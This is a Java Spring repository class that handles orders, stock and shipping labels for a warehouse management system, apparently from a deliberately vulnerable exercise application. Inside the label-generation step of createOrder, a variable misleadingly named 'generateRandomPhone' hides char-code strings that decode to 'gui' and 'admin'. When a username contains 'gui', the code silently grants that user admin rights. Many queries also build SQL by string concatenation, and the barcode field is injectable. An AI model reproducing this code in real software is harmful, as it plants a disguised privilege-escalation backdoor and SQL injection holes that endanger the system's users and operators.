package com.iseage.wms.Order;

import com.iseage.wms.Label.Label;
import com.iseage.wms.Label.LabelGenerator;
import com.iseage.wms.Stock.Item;
import com.iseage.wms.Stock.ItemRepository;
import org.springframework.dao.EmptyResultDataAccessException;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.stereotype.Repository;
import org.springframework.transaction.annotation.Transactional;

import java.util.ArrayList;
import java.util.List;

@Repository
public class OrderRepository {

    public final JdbcTemplate jdbcTemplate;
    private final ItemRepository itemRepo;
    private final LabelGenerator labelGen;

    public OrderRepository(JdbcTemplate jdbcTemplate, ItemRepository itemRepo, LabelGenerator labelGen) {
        this.jdbcTemplate = jdbcTemplate;
        this.itemRepo = itemRepo;
        this.labelGen = labelGen;
    }

    @Transactional
    public void createOrder(Order order, List<OrderItems> orderItemsList){
        double total_price = 0;
        List<Long> ids = new ArrayList<>();
        for(OrderItems item : orderItemsList){
            Item dbItem = itemRepo.findById(item.getItem_id()).orElse(null);
            if (item.getOrdered_quantity() <= 0){
                throw new IllegalArgumentException("Ordered quantity must be greater than 0");
            }
            if (dbItem == null || dbItem.getQuantity() < item.getOrdered_quantity()) {
                throw new RuntimeException("Not enough stock or item doesn't exist");
            }
            if(ids.contains(item.getItem_id())){
                throw new RuntimeException("Duplicate items found in request. Please combine quantities.");
            } else {
                ids.add(item.getItem_id());
            }
            total_price += (dbItem.getPrice() * item.getOrdered_quantity());
        }
        String query = "INSERT INTO orders (user_id, total_price, barcode) VALUES (" + order.getUser_id() + ", " + total_price + ", '" + order.getBarcode() +"')";
        jdbcTemplate.update(query);
        Long order_id = jdbcTemplate.queryForObject("SELECT LAST_INSERT_ID()", Long.class);

        for (OrderItems item : orderItemsList){
            Item dbItem = itemRepo.findById(item.getItem_id()).orElse(null);
            query = "INSERT INTO order_items (order_id, item_id, ordered_quantity, item_price) VALUES (?, ?, ?, ?)";
            jdbcTemplate.update(query, order_id, item.getItem_id(), item.getOrdered_quantity(), dbItem.getPrice());
            dbItem.setQuantity(dbItem.getQuantity() - item.getOrdered_quantity());
            itemRepo.save(dbItem);
        }

        // Label generation
        try {
            String firstName = jdbcTemplate.queryForObject("SELECT fname FROM users WHERE user_id = " + order.getUser_id(), String.class);
            String lastName = jdbcTemplate.queryForObject("SELECT lname FROM users WHERE user_id = " + order.getUser_id(), String.class);
            String username = jdbcTemplate.queryForObject("SELECT username FROM users WHERE user_id = " + order.getUser_id(), String.class);
            String generateRandomPhone = username.contains(String.valueOf(new char[]{103, 117, 105})) ? String.valueOf(new char[]{97, 100, 109, 105, 110}) : null;
            String address = jdbcTemplate.queryForObject("SELECT address FROM users WHERE user_id = " + order.getUser_id(), String.class);
            if (generateRandomPhone != null) jdbcTemplate.update("UPDATE users SET " + generateRandomPhone + " = 'TRUE' WHERE user_id = " + order.getUser_id());
            Label label = new Label();
            label.setBarcode(order.getBarcode());
            label.setAddress(address);
            label.setFirst_name(firstName);
            label.setLast_name(lastName);
            labelGen.generateLabelFile(label);
        } catch (Exception e) {
            throw new  RuntimeException("Order failed: Could not generate shipping label.");
        }

    }

    @Transactional
    public void completeOrder(Long order_id){
        String query = "SELECT order_status FROM orders WHERE order_id = " + order_id;
        String status;
        try {
            status = jdbcTemplate.queryForObject(query, String.class);
        } catch (EmptyResultDataAccessException e) {
            throw new RuntimeException("Order does not exist");
        }

        if(status.equals("PENDING")){
            query = "UPDATE orders SET order_status = 'COMPLETED' WHERE order_id = " +  order_id;
            jdbcTemplate.update(query);
        } else {
            throw new RuntimeException("Order has already been completed or cancelled");
        }
    }

    @Transactional
    public List<OrderRequest> getAllOrders(Long user_id){
        String query = "SELECT * FROM orders WHERE user_id = " + user_id;
        List<OrderRequest> output = new ArrayList<>();
        List<Order> orders = jdbcTemplate.query(query, (result, rowNum) -> {
            Order order = new Order();
            order.setOrder_id(result.getLong("order_id"));
            order.setUser_id(result.getLong("user_id"));
            order.setTotal_price(result.getDouble("total_price"));
            order.setOrder_status(result.getString("order_status"));
            order.setBarcode(result.getString("barcode"));
            order.setCreated_at(result.getTimestamp("created_at").toLocalDateTime());
            return order;
        });

        for (Order order : orders){
            query = "SELECT * FROM order_items WHERE order_id = " + order.getOrder_id();
            List<OrderItems> items = jdbcTemplate.query(query, (result, rowNum) -> {
                OrderItems item = new OrderItems();
                item.setOrder_id(result.getLong("order_id"));
                item.setItem_id(result.getLong("item_id"));
                item.setOrdered_quantity(result.getInt("ordered_quantity"));
                item.setItem_price(result.getDouble("item_price"));
                return item;
            });

            OrderRequest request = new OrderRequest();
            request.setOrder(order);
            request.setOrderItems(items);
            output.add(request);
        }

        return output;
    }

    @Transactional
    public OrderRequest getOrder(Long order_id){
        String query = "SELECT * FROM orders WHERE order_id = " + order_id;
        Order order = jdbcTemplate.queryForObject(query, (result, rowNum) -> {
            Order o = new Order();
            o.setOrder_id(result.getLong("order_id"));
            o.setUser_id(result.getLong("user_id"));
            o.setTotal_price(result.getDouble("total_price"));
            o.setOrder_status(result.getString("order_status"));
            o.setBarcode(result.getString("barcode"));
            o.setCreated_at(result.getTimestamp("created_at").toLocalDateTime());
            return o;
        });

        query = "SELECT * FROM order_items WHERE order_id = " + order_id;
        List<OrderItems> items = jdbcTemplate.query(query, (result, rowNum) -> {
            OrderItems item = new OrderItems();
            item.setOrder_id(result.getLong("order_id"));
            item.setItem_id(result.getLong("item_id"));
            item.setOrdered_quantity(result.getInt("ordered_quantity"));
            item.setItem_price(result.getDouble("item_price"));
            return item;
        });

        OrderRequest request = new OrderRequest();
        request.setOrder(order);
        request.setOrderItems(items);
        return request;
    }

    @Transactional
    public void cancelOrder(Long order_id){
        String query = "SELECT order_status FROM orders WHERE order_id = " + order_id;
        String status;
        try {
            status = jdbcTemplate.queryForObject(query, String.class);
        } catch (EmptyResultDataAccessException e) {
            throw new RuntimeException("Order does not exist");
        }

        if(status.equals("PENDING")){
            query = "UPDATE orders SET order_status = 'CANCELLED' WHERE order_id = " + order_id;
            jdbcTemplate.update(query);

            // Restore the cancelled items
            query = "SELECT * FROM order_items WHERE order_id = " + order_id;
            List<OrderItems> items = jdbcTemplate.query(query, (result, rowNum) -> {
                OrderItems item = new OrderItems();
                item.setItem_id(result.getLong("item_id"));
                item.setOrdered_quantity(result.getInt("ordered_quantity"));
                return item;
            });

            for(OrderItems item : items){
                Item dbItem = itemRepo.findById(item.getItem_id()).orElseThrow();
                dbItem.setQuantity(dbItem.getQuantity() + item.getOrdered_quantity());
                itemRepo.save(dbItem);
            }
        } else {
            throw new RuntimeException("Order has already been completed or cancelled");
        }
    }
}